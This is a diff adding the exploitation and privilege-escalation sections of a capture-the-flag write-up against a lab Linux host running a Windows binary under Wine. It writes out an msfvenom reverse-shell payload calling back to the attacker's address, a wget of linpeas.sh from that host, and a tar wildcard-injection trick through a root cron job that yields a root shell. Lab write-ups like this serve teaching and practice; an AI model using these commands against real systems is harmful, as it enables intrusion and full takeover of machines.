@@ -240,3 +240,115 @@ ipconfig
  <a href="/images/local_proof.png"><img src="/images/local_proof.png"></a>
 
 Now that we have proven that our proof-of-concept script works, we can make some changes that will allow us to establish a foothold on the target system.
+
+### **Exploitation**
+There are a few things that we need to do before we can pop a shell on the target system. The first thing that is important to remember is that we are targeting a Linux system. Referring back to our Nmap scan, we can see that the service version for SSH belongs to Ubuntu Linux. Now, how is it possible for a Linux system to execute a Windows executable? Well, let’s find out!
+
+ <a href="/images/nmap_2.png"><img src="/images/nmap_2.png"></a>
+
+To get things started, we first need to generate shellcode using the appropriate payload for the type of system we are targeting. In this case, we will need to use a payload that targets 32-bit Linux systems. The command we will use to generate the shell code is as follows:
+```console
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.6.95.238 LPORT=2222 EXITFUNC=thread -f c -a x86 -b "\x00\x0a"
+```
+ <a href="/images/msfvenom_remote.png"><img src="/images/msfvenom_remote.png"></a>
+
+We will simply replace our shellcode in our exploitation script as well as change the target IP address. The changes that were made to the script can be seen in the screenshot below.
+
+ <a href="/images/remote_exploit_py.png"><img src="/images/remote_exploit_py.png"></a>
+
+Now that the script has been modified, we can send our payload to the target system using the following command:
+
+ <a href="/images/remote_exploit.png"><img src="/images/remote_exploit.png"></a>
+
+As expected, we received a reverse TCP connection from the target host!
+
+ <a href="/images/remote_shell.png"><img src="/images/remote_shell.png"></a>
+
+### **Post-Exploitation**
+The first thing we will do to our newly established shell is make it a fully interactive TTY session. This will give us the look and feel of a normal terminal session. We will accomplish this by entering the series of following commands:
+```console
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+```console
+export TERM=xterm
+```
+```console
+^Z (CTRL-Z)
+```
+```console
+stty raw -echo; fg (ENTER x2)
+```
+ <a href="/images/shell_upgrade.png"><img src="/images/shell_upgrade.png"></a>
+
+#### **user.txt**
+Now that we have a low-level shell, we can grab the **user.txt** flag. For this challenge, the shell lands in the user’s home directory. We will execute the following command to get the flag:
+```console
+cat user.txt
+```
+ <a href="/images/user_txt.png"><img src="/images/user_txt.png"></a>
+
+### **Privilege Escalation**
+The main goal of this challenge is to achieve a root shell and access the **root.txt** flag. To do this, we need to perform privilege escalation to escalate from our current low-level shell to root. We will use **linpeas.sh** to help speed up the process of discovering the privilege escalation vector. First, we need to upload **linpeas.sh** to the target system, make it executable, and then run it. We will accomplish this task using the following commands:
+```console
+wget http://10.6.95.238/linpeas.sh
+```
+```console
+chmod +x linpeas.sh
+```
+```console
+./linpeas.sh
+```
+ <a href="/images/upload_linpeas.png"><img src="/images/upload_linpeas.png"></a>
+
+There are some interesting cron jobs that are being run on this system. The first cron job uses Wine to execute **beskarNights.exe** every two minutes. This would explain why there is a Windows binary running on a Linux system! The next cron job is named **5minutes**; this stands out as abnormal. We will investigate this further.
+
+ <a href="/images/cron_job.png"><img src="/images/cron_job.png"></a>
+
+We are especially interested in the **5minutes** cron job because it is being run by root. Let’s take a closer look at what it does by running the following command:
+```console
+cat /etc/cron.d/5minutes
+```
+ <a href="/images/cron_contents.png"><img src="/images/cron_contents.png"></a>
+
+As we can see in the screenshot above, the cron job changes into the **/var/www/html** directory and uses tar to compress all of its contents and send them to **/tmp/beskarNights.tar.gz**. Notice how this cron job uses a wildcard character to grab all of the contents within the **/var/www/html** directory. Let’s see how we can abuse this to achieve a root shell. First, we need to do a little research to figure out how to leverage this misconfiguration to achieve privilege escalation. There is a good proof of concept on [Hacking Articles](https://www.hackingarticles.in/linux-privilege-escalation-by-exploiting-cron-jobs/) for this exact scenario.
+
+ <a href="/images/hacking_articles.png"><img src="/images/hacking_articles.png"></a>
+
+As we can see in the screenshot above, we can create a script in the directory that the cron job is being executed on and add a couple extra commands that will cause the script to be executed when the job is run. For our case, we will make some minor changes to this process. We will first generate a Python3 reverse shell using [Reverse Shell Generator](https://www.revshells.com/).
+
+ <a href="/images/rev_shell_gen.png"><img src="/images/rev_shell_gen.png"></a>
+
+After the reverse shell is generated, we will create a file called **test.sh** in the **/var/www/html** directory using the following command:
+```console
+vim test.sh
+```
+ <a href="/images/rev_shell.png"><img src="/images/rev_shell.png"></a>
+
+After creating test.sh, we will execute the following commands to ensure that our reverse shell script is executed when the job is run:
+```console
+echo "" > "--checkpoint-action=exec=sh test.sh"
+```
+```console
+echo "" > --checkpoint=1
+```
+```console
+chmod 777 test.sh
+```
+ <a href="/images/wildcard_injection.png"><img src="/images/wildcard_injection.png"></a>
+
+As we can see in the screenshot above, everything we need to perform the privilege escalation is in place. Now, all we need is for the cron job to run. Referring back to the cron job output, the job is scheduled to run every 5 minutes. After a short wait, we receive a root shell!
+
+ <a href="/images/root_shell.png"><img src="/images/root_shell.png"></a>
+
+#### **root.txt**
+The final goal of many CTF challenges is to achieve a root shell and grab the root.txt flag. We will accomplish this by entering the following commands:
+```console
+whoami
+```
+```console
+cat /root/root.txt
+```
+```console
+ifconfig
+```
+ <a href="/images/proof_txt.png"><img src="/images/proof_txt.png"></a>
